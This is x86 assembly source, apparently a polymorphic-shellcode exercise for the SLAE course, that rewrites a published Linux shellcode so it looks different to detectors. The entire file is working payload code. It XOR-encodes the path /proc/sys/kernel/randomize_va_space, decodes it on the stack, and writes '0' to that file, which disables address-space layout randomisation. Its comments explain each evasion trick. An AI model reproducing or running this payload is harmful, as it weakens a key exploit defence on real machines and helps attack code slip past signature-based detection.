; SLAE - Assignment #6: Polymorphic Shellcodes (Linux/x86) - Part1
; Original: http://shell-storm.org/shellcode/files/shellcode-813.php
; Author:   Julien Ahrens (@MrTuxracer)
; Website:  http://www.rcesecurity.com 

global _start			

section .text
_start:
	xor eax, eax
	add eax, 0x25 		;length of payload +1 to keep decrementing loop working

	;push eax

	;Let's XOR encode the payload with 0xab

	;push dword 0x65636170
	push dword 0xcec8cadb
	;push dword 0x735f6176
	push dword 0xd8f4cadd
	;push dword 0x5f657a69
	push dword 0xf4ced1c2
	;push dword 0x6d6f646e
	push dword 0xc6c4cfc5
	;push dword 0x61722f6c
	push dword 0xcad984c7
	;push dword 0x656e7265
	push dword 0xcec5d9ce
	;push dword 0x6b2f7379
	push dword 0xc084d8d2
	;push dword 0x732f636f
	push dword 0xd884c8c4
	;push dword 0x72702f2f
	push dword 0xd9db8484

	;and decode it on the stack using a decrementing loop to get 0x0 into EAX
	loop0:
		dec al
		mov cl,[esp+eax]
		xor cl,0xab
		mov [esp+eax],cl
		cmp al, ah
	jne loop0

	mov [esp+0x24], eax 	;replaces the "push eax" instruction from the beginning

	mov ebx,esp
	;mov cx,0x2bc
	sub cx,0xcc73 		;since cl contains 0x2f from the decoding, subtracting  0xcc73 results in 0x2bc
	;mov al,0x8
	add al, 0x8 		;eax is 0x0, so adding 0x8 to get the next syscall (sys_creat)
	int 0x80

	mov ebx,eax
	push eax
	;mov dx,0x3a30
	mov dx, 0x1111
	add dx, 0x291f 		;a simple addition to get 0x3a30 into dx
	push dx
	mov ecx,esp
	;xor edx,edx
	mov edx,[esp+0x2a] 	;use 0-bytes from the payload instead of using xor for termination
	inc edx
	;mov al,0x4
	imul eax, edx, 0x4 	;multiply edx with 0x4 to get next syscall (sys_write)
	int 0x80

	;mov al,0x6
	imul eax, edx, 0x6 	;multiply edx with 0x4 to get next syscall (sys_close)
	int 0x80

	inc eax
	int 0x80
